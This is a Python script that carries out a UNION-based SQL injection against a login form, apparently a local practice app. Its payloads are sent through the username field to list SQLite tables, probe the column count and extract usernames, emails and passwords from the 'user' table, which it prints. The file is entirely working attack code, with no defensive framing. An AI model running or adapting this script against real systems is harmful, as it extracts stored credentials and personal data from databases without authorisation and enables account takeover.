import requests
from bs4 import BeautifulSoup

# Base URL for the login or registration form
base_url = "http://127.0.0.1:5000/login"  # Change this to the correct endpoint (register/login)

# Function to check the response for a given SQL payload
def test_sql_injection(payload):
    data = {
        "username": payload,
        "password": "Password!1234"
    }
    
    response = requests.post(base_url, data=data)
    
    if response.status_code == 200:
        return response.text
    else:
        return None

# Step 1: Find all table names in the database
def find_tables():
    print("\n[*] Step 1: Finding table names...")

    # Payload to retrieve table names from the sqlite_master table
    payload = "' UNION SELECT 1, tbl_name, 3, 4, 5, 6, 7, 8 FROM sqlite_master WHERE type='table' -- "
    response = test_sql_injection(payload)

    # Check if the response contains any table names
    if response:
        print("[*] Raw HTML Response received:\n")
        print(response[:500])  # Printing only the first 500 characters for clarity
        
        # Parse the table names from the response
        soup = BeautifulSoup(response, 'html.parser')
        tables = []
        
        # Look for all table rows in the response
        for idx, row in enumerate(soup.find_all('tr')):
            print(f"[DEBUG] Parsing row {idx}: {row}")  # Debugging: print the full row HTML
            
            columns = row.find_all('td')
            
            # Print debug for columns extracted
            print(f"[DEBUG] Columns found: {[col.get_text(strip=True) for col in columns]}")
            
            # Ensure there are enough columns in the row (minimum of 2 for 'id' and 'tbl_name')
            if len(columns) > 1:
                # Extract table name from the correct column (index 1 for 'tbl_name')
                table_name = columns[0].get_text(strip=True)
                print(f"[DEBUG] Extracted table name: {table_name}")
                
                # Append the table name to our list if it's not empty
                if table_name:
                    tables.append(table_name)
        
        if tables:
            print(f"[+] Found tables: {tables}")
            return tables
        else:
            print("[-] No tables found in the response.")
            return []
    else:
        print("[-] Failed to retrieve table names.")
        return []

# Step 2: Find the number of columns in a table (specifically the 'user' table)
def find_column_count(table_name):
    print(f"\n[*] Step 2: Finding number of columns for table '{table_name}'...")

    # Iteratively test SQL injection by increasing the number of columns
    for i in range(1, 11):  # Assuming the number of columns is between 1 and 10
        payload = f"' UNION SELECT {','.join(['NULL'] * i)} FROM {table_name} -- "
        response = test_sql_injection(payload)
        
        if response and "SQL Injection successful" in response:
            print(f"[+] Found the correct number of columns: {i}")
            return i
    
    print("[-] Couldn't determine the number of columns.")
    return None

# Step 3: Retrieve table data using SQL Injection
def retrieve_table_data(column_count):
    print("\n[*] Step 3: Retrieving table data...")

    # Vulnerable SQL Injection payload to retrieve data from the user table
    # We're now explicitly selecting the username, email, and password columns
    payload = f"' UNION SELECT NULL, username, email, password, {', '.join(['NULL'] * (column_count - 4))} FROM user -- "

    data = {
        "username": payload,
        "password": "Password!1234"
    }
    
    response = requests.post(base_url, data=data)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, "html.parser")
        
        print("[+] Data retrieved from the 'user' table:")
        print("Username | Email | Password")
        
        for row_idx, row in enumerate(soup.find_all('tr')[1:]):  # Assuming the first row is the header
            columns = row.find_all('td')
            if len(columns) >= 3:
                username = columns[0].get_text(strip=True)
                email = columns[1].get_text(strip=True)
                password = columns[2].get_text(strip=True)
                
                # Print extracted data
                print(f"(*) {username} | {email} | {password}\n")
            else:
                print(f"[DEBUG] Row {row_idx + 1} did not have enough columns to extract data.")
    else:
        print("[-] Failed to retrieve data from 'user' table.")


# Main function to execute the steps
def main():
    tables = find_tables()

    if tables:
        if 'user' in tables:
            column_count = find_column_count('user')

            if column_count:
                retrieve_table_data(column_count)

            else:
                print("[-] Could not determine the number of columns for the 'user' table.")
        else:
            print("[-] 'user' table not found.")
    else:
        print("[-] No tables found.")

if __name__ == "__main__":
    main()